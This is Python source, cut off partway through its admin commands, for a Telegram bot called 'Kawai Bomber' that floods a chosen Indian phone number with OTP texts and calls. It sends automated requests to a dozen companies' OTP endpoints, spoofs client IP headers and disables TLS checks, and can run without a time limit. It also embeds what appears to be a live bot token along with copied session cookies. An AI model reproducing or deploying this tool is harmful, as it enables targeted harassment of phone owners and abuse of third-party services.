#!/usr/bin/env python3
import os
import sys

# Get Railway-specific environment variables
PORT = os.getenv('PORT', None)
RAILWAY_ENVIRONMENT = os.getenv('RAILWAY_ENVIRONMENT', 'production')

print(f"🚂 Railway Environment: {RAILWAY_ENVIRONMENT}")
print(f"🌐 PORT: {PORT}")

import asyncio
import json
import random
import time
import urllib.parse
from typing import Dict, List, Tuple, Set
from collections import defaultdict
import aiohttp
from aiohttp import ClientSession, ClientTimeout
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
from telegram.constants import ParseMode
import logging
import signal
import atexit
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "8165905656:AAF3VSZLTvvLcyY73JdvPq8FWZPyPC7JNcw")
ADMIN_ID = 8291098446  # Your Telegram user ID

# Store user data
user_sessions = {}
user_stats = defaultdict(lambda: {"requests": 0, "success": 0, "failed": 0})
approved_users = set()
admin_users = set([ADMIN_ID])
banned_users = set()
all_users = set()

# Global stats
global_stats = {
    "total_bombs": 0,
    "active_sessions": 0,
    "total_users": 0,
    "total_requests": 0,
    "start_time": time.time()
}

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# ========== ANIME STYLES ==========
ANIME_STYLES = {
    "header": "🌸✨",
    "success": "✅",
    "error": "❌",
    "warning": "⚠️",
    "info": "ℹ️",
    "fire": "🔥",
    "bomb": "💣",
    "phone": "📱",
    "shield": "🛡️",
    "crown": "👑",
    "star": "⭐",
    "heart": "❤️",
    "clock": "⏰",
    "rocket": "🚀",
    "lightning": "⚡",
    "skull": "💀",
    "ghost": "👻",
    "dragon": "🐉",
    "ninja": "🥷",
    "back": "🔙",
    "hourglass": "⏳",
    "users": "👥",
    "zap": "⚡",
    "unlock": "🔓",
    "lock": "🔒",
    "boom": "💥"
}

# ========== YOUR WORKING API CONFIGURATIONS ==========
API_CONFIGS = [
    {
        "name": "Hungama",
        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "payload": {
            "mobileNo": "{phone}",
            "countryCode": "+91",
            "appCode": "un",
            "messageId": "1",
            "emailId": "",
            "subject": "Register",
            "priority": "1",
            "device": "web",
            "variant": "v1",
            "templateCode": 1
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "alang": "en",
            "country_code": "IN",
            "vlang": "en",
            "origin": "https://www.hungama.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "Meru Cab",
        "endpoint": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "payload": {"mobile_number": "{phone}"},
        "headers": {
            "Mobilenumber": "{phone}",
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "merucabapp.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "Dayco India",
        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone}", "resend_otp": "resend_otp"},
        "headers": {
            "Host": "ekyc.daycoindia.com",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ekyc.daycoindia.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
            "Priority": "u=1, i",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "Doubtnut",
        "endpoint": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "payload": {
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "course": "",
            "phone_number": "{phone}",
            "language": "en",
            "udid": "b751fb63c0ae17ba",
            "class": "",
            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
        },
        "headers": {
            "version_code": "1160",
            "has_upi": "false",
            "device_model": "ASUS_I005DA",
            "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.2",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "NoBroker",
        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "payload": {"phone": "{phone}", "countryCode": "IN"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
            "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
            "origin": "https://www.nobroker.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.nobroker.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "Shiprocket",
        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "payload": {"mobileNumber": "{phone}"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer null",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://app.shiprocket.in",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.shiprocket.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "Tata Capital",
        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "payload": {"phone": "{phone}", "applSource": "", "isOtpViaCallAtLogin": "true"},
        "headers": {
            "Content-Type": "application/json",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "PenPencil",
        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"},
        "headers": {
            "Host": "api.penpencil.co",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "1mg",
        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "payload": {"number": "{phone}", "is_corporate_user": False, "otp_on_call": True},
        "headers": {
            "Host": "www.1mg.com",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "Swiggy",
        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "payload": {"mobile": "{phone}"},
        "headers": {
            "Host": "profile.swiggy.com",
            "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
            "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
            "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
            "pl-version": "55",
            "user-agent": "Swiggy-Android",
            "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
            "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
            "version-code": "1161",
            "app-version": "4.38.1",
            "latitude": "0.0",
            "longitude": "0.0",
            "os-version": "13",
            "accessibility_enabled": "false",
            "swuid": "4c27ae3a76b146f3",
            "deviceid": "4c27ae3a76b146f3",
            "x-network-quality": "GOOD",
            "accept-encoding": "gzip",
            "accept": "application/json; charset=utf-8",
            "content-type": "application/json; charset=utf-8",
            "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "KPN Fresh",
        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "payload": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
        "headers": {
            "Host": "api.kpnfresh.com",
            "sec-ch-ua-platform": "\"Android\"",
            "cache": "no-store",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "x-channel-id": "WEB",
            "sec-ch-ua-mobile": "?1",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.kpnfresh.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "priority": "u=1, i",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    },
    {
        "name": "Servetel",
        "endpoint": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "payload": {"mobile_number": "{phone}"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Host": "api.servetel.in",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        }
    }
]

# ========== PERSISTENCE FUNCTIONS ==========
def save_state():
    """Save bot state to file"""
    try:
        state = {
            "approved_users": list(approved_users),
            "admin_users": list(admin_users),
            "banned_users": list(banned_users),
            "all_users": list(all_users),
            "global_stats": global_stats
        }
        with open("bot_state.json", "w") as f:
            json.dump(state, f, indent=2)
        logger.info("✅ State saved")
    except Exception as e:
        logger.error(f"❌ Error saving state: {e}")

def load_state():
    """Load bot state from file"""
    try:
        if os.path.exists("bot_state.json"):
            with open("bot_state.json", "r") as f:
                state = json.load(f)
                approved_users.update(state.get("approved_users", []))
                admin_users.update(state.get("admin_users", []))
                banned_users.update(state.get("banned_users", []))
                all_users.update(state.get("all_users", []))
                global_stats.update(state.get("global_stats", global_stats))
            logger.info("✅ State loaded")
    except Exception as e:
        logger.error(f"❌ Error loading state: {e}")

# ========== HELPER FUNCTIONS ==========
def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in admin_users

def is_approved(user_id: int) -> bool:
    """Check if user is approved"""
    return user_id in admin_users or user_id in approved_users

def is_banned(user_id: int) -> bool:
    """Check if user is banned"""
    return user_id in banned_users

def format_number(number: str) -> str:
    """Format phone number with +91"""
    if len(number) == 10:
        return f"+91{number}"
    return number

def get_anime_banner() -> str:
    """Generate anime-style banner"""
    return f"""
{ANIME_STYLES['dragon']}{ANIME_STYLES['ninja']}{ANIME_STYLES['fire']}{ANIME_STYLES['bomb']}{ANIME_STYLES['lightning']}{ANIME_STYLES['ghost']}
╔══════════════════════════════════════╗
║    {ANIME_STYLES['crown']}   𝐊𝐀𝐖𝐀𝐈 𝐁𝐎𝐌𝐁𝐄𝐑   {ANIME_STYLES['crown']}    ║
║   {ANIME_STYLES['rocket']} 𝔸𝕟𝕚𝕞𝕖 𝕊𝕄𝕊/ℂ𝕒𝕝𝕝 𝔹𝕠𝕞𝕓𝕖𝕣 {ANIME_STYLES['rocket']}   ║
╠══════════════════════════════════════╣
║ {ANIME_STYLES['star']}  𝕄𝕒𝕕𝕖 𝕓𝕪: @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙      {ANIME_STYLES['star']}  ║
║ {ANIME_STYLES['heart']} ℙ𝕠𝕨𝕖𝕣𝕖𝕕 𝕓𝕪: @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙  {ANIME_STYLES['heart']}  ║
╚══════════════════════════════════════╝
"""

# ========== CORE BOMBING FUNCTIONS ==========
async def send_request(session: ClientSession, api_config: Dict, phone: str, user_id: int):
    """Send single request"""
    try:
        # Prepare data
        formatted_phone = format_number(phone)
        ip_address = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
        
        # Format payload and headers
        payload = {}
        for k, v in api_config["payload"].items():
            if isinstance(v, str):
                payload[k] = v.format(phone=formatted_phone)
            elif isinstance(v, bool):
                payload[k] = v
            else:
                payload[k] = str(v)
        
        headers = {}
        for k, v in api_config["headers"].items():
            if isinstance(v, str):
                headers[k] = v.format(phone=formatted_phone, ip=ip_address)
            else:
                headers[k] = str(v)
        
        timeout = ClientTimeout(total=3)
        
        if api_config["method"] == "POST":
            if "application/x-www-form-urlencoded" in headers.get("Content-Type", ""):
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())
                async with session.post(
                    api_config["endpoint"],
                    data=payload_str,
                    headers=headers,
                    timeout=timeout,
                    ssl=False
                ) as response:
                    status = response.status
                    await response.read()
            else:
                async with session.post(
                    api_config["endpoint"],
                    json=payload,
                    headers=headers,
                    timeout=timeout,
                    ssl=False
                ) as response:
                    status = response.status
                    await response.read()
        else:
            return False, api_config["name"]
        
        # Update stats
        user_stats[user_id]["requests"] += 1
        global_stats["total_requests"] += 1
        
        if status in [200, 201, 202, 204]:
            user_stats[user_id]["success"] += 1
            return True, api_config["name"]
        else:
            user_stats[user_id]["failed"] += 1
            return False, api_config["name"]
            
    except Exception as e:
        user_stats[user_id]["failed"] += 1
        global_stats["total_requests"] += 1
        return False, api_config["name"]

async def bombing_attack(phone: str, user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Main bombing attack function"""
    start_time = time.time()
    max_time = 3600  # 1 hour for non-approved users
    
    if is_approved(user_id):
        max_time = float('inf')  # No limit for approved users
    
    # Send starting message
    start_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"""
{ANIME_STYLES['rocket']} *𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃* {ANIME_STYLES['rocket']}

{ANIME_STYLES['phone']} 𝐓𝐚𝐫𝐠𝐞𝐭: `{phone}`
{ANIME_STYLES['clock']} 𝐓𝐢𝐦𝐞 𝐋𝐢𝐦𝐢𝐭: {'𝕌𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕' if is_approved(user_id) else '𝟙 ℍ𝕠𝕦𝕣'}
{ANIME_STYLES['fire']} 𝐌𝐨𝐝𝐞: 𝔸𝕘𝕘𝕣𝕖𝕤𝕤𝕚𝕧𝕖

{ANIME_STYLES['lightning']} *ℝ𝔼𝔸𝔻𝕐 𝕋𝕆 𝕃𝔸𝕌ℕℂℍ!* {ANIME_STYLES['lightning']}
        """,
        parse_mode=ParseMode.MARKDOWN
    )
    
    active_apis = API_CONFIGS.copy()
    attack_count = 0
    successful_apis = set()
    
    try:
        while time.time() - start_time < max_time:
            if user_id not in user_sessions:
                break
                
            attack_count += 1
            
            # Send requests
            async with aiohttp.ClientSession() as session:
                tasks = [send_request(session, api, phone, user_id) for api in active_apis]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results
                new_apis = []
                for result in results:
                    if isinstance(result, Exception):
                        continue
                    success, api_name = result
                    if success:
                        successful_apis.add(api_name)
                        new_apis.append(next(api for api in API_CONFIGS if api["name"] == api_name))
                
                # Keep successful APIs, rotate if none work
                if new_apis:
                    active_apis = new_apis
                else:
                    active_apis = API_CONFIGS.copy()
            
            # Update status every 10 attacks
            if attack_count % 10 == 0:
                elapsed = int(time.time() - start_time)
                remaining = max(0, max_time - elapsed) if max_time != float('inf') else "∞"
                stats = user_stats[user_id]
                success_rate = (stats['success'] / stats['requests'] * 100) if stats['requests'] > 0 else 0
                
                status_text = f"""
{ANIME_STYLES['fire']} *𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒* {ANIME_STYLES['fire']}

{ANIME_STYLES['bomb']} 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: `{attack_count}`
{ANIME_STYLES['clock']} 𝐄𝐥𝐚𝐩𝐬𝐞𝐝: `{elapsed}s`
{ANIME_STYLES['hourglass']} 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: `{remaining}s`
{ANIME_STYLES['rocket']} 𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐏𝐈𝐬: `{len(active_apis)}`
{ANIME_STYLES['success']} 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: `{success_rate:.1f}%`

{ANIME_STYLES['lightning']} *𝔽𝕀ℝ𝔼 𝔸𝕋 𝕎𝕀𝕃𝕃!* {ANIME_STYLES['lightning']}
                """
                
                try:
                    await start_msg.edit_text(status_text, parse_mode=ParseMode.MARKDOWN)
                except:
                    pass
            
            # Aggressive delay
            await asyncio.sleep(0.5)
            
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Attack error: {e}")
    finally:
        # Send completion message
        elapsed = int(time.time() - start_time)
        stats = user_stats[user_id]
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"""
{ANIME_STYLES['shield']} *𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃* {ANIME_STYLES['shield']}

{ANIME_STYLES['bomb']} 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: `{attack_count}`
{ANIME_STYLES['clock']} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: `{elapsed}s`
{ANIME_STYLES['success']} 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: `{stats['success']}`
{ANIME_STYLES['error']} 𝐅𝐚𝐢𝐥𝐞𝐝: `{stats['failed']}`
{ANIME_STYLES['star']} 𝐓𝐨𝐭𝐚𝐥 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬: `{stats['requests']}`

{ANIME_STYLES['star']} *𝕄𝕀𝕊𝕊𝕀𝕆ℕ 𝔸ℂℂ𝕆𝕄ℙ𝕃𝕀𝕊ℍ𝔼𝔻* {ANIME_STYLES['star']}
            """,
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Remove user session
        if user_id in user_sessions:
            del user_sessions[user_id]
            global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)

# ========== TELEGRAM BOT HANDLERS ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text(
            f"{ANIME_STYLES['skull']} *𝐘𝐎𝐔 𝐀𝐑𝐄 𝐁𝐀𝐍𝐍𝐄𝐃* {ANIME_STYLES['skull']}\n\n"
            "ℂ𝕠𝕟𝕥𝕒𝕔𝕥 @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙 𝕗𝕠𝕣 𝕒𝕡𝕡𝕖𝕒𝕝.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    all_users.add(user_id)
    global_stats["total_users"] = len(all_users)
    save_state()
    
    keyboard = [
        [InlineKeyboardButton(f"{ANIME_STYLES['fire']} 𝐒𝐭𝐚𝐫𝐭 𝐀𝐭𝐭𝐚𝐜𝐤", callback_data='start_attack')],
        [InlineKeyboardButton(f"{ANIME_STYLES['info']} 𝐇𝐞𝐥𝐩", callback_data='help'),
         InlineKeyboardButton(f"{ANIME_STYLES['star']} 𝐒𝐭𝐚𝐭𝐮𝐬", callback_data='status')]
    ]
    
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton(f"{ANIME_STYLES['crown']} 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥", callback_data='admin_panel')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        get_anime_banner(),
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bomb command"""
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['skull']} 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐛𝐚𝐧𝐧𝐞𝐝!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/bomb <phone_number>`\n"
            f"𝔼𝕩𝕒𝕞𝕡𝕝𝕖: `/bomb 9876543210`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    phone = context.args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕡𝕙𝕠𝕟𝕖 𝕟𝕦𝕞𝕓𝕖𝕣! 𝕄𝕦𝕤𝕥 𝕓𝕖 𝟙𝟘 𝕕𝕚𝕘𝕚𝕥𝕤.")
        return
    
    if user_id in user_sessions:
        await update.message.reply_text(f"{ANIME_STYLES['warning']} 𝕐𝕠𝕦 𝕒𝕝𝕣𝕖𝕒𝕕𝕪 𝕙𝕒𝕧𝕖 𝕒𝕟 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜! 𝕌𝕤𝕖 /𝕤𝕥𝕠𝕡 𝕗𝕚𝕣𝕤𝕥.")
        return
    
    # Start bombing attack
    task = asyncio.create_task(bombing_attack(phone, user_id, update.effective_chat.id, context))
    user_sessions[user_id] = {
        "start_time": time.time(),
        "phone": phone,
        "task": task
    }
    global_stats["active_sessions"] += 1
    global_stats["total_bombs"] += 1

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        user_sessions[user_id]["task"].cancel()
        try:
            await user_sessions[user_id]["task"]
        except asyncio.CancelledError:
            pass
        del user_sessions[user_id]
        global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)
        await update.message.reply_text(f"{ANIME_STYLES['shield']} 𝔸𝕥𝕥𝕒𝕔𝕜 𝕤𝕥𝕠𝕡𝕡𝕖𝕕 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝𝕝𝕪!")
    else:
        await update.message.reply_text(f"{ANIME_STYLES['info']} ℕ𝕠 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜 𝕥𝕠 𝕤𝕥𝕠𝕡.")

# ========== ADMIN COMMANDS ==========
async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addadmin command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/addadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        new_admin = int(context.args[0])
        admin_users.add(new_admin)
        approved_users.add(new_admin)
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['crown']} 𝕌𝕤𝕖𝕣 `{new_admin}` 𝕒𝕕𝕕𝕖𝕕 𝕒𝕤 𝕒𝕕𝕞𝕚𝕟!", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /approve command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/approve <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        user_to_approve = int(context.args[0])
        approved_users.add(user_to_approve)
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['success']} 𝕌𝕤𝕖𝕣 `{user_to_approve}` 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕!", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕦𝕤𝕖𝕣 𝕀𝔻!")

async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /removeuser command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝔸𝕕𝕞𝕚𝕟 𝕠𝕟𝕝𝕪!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(f"{ANIME_STYLES['error']} 𝐔𝐬𝐚𝐠𝐞: `/removeuser <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        user_to_remove = int(context.args[0])
        approved_users.discard(user_to_remove)
        save_state()
        await update.message.reply_text(f"{ANIME_STYLES['success']} 𝕌𝕤𝕖𝕣 `{user_to_remove}` 𝕣𝕖𝕞𝕠𝕧𝕖𝕕 𝕗𝕣𝕠𝕞 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕝𝕚𝕤𝕥!", parse_mode=ParseMode.MARKDOWN)
    except:
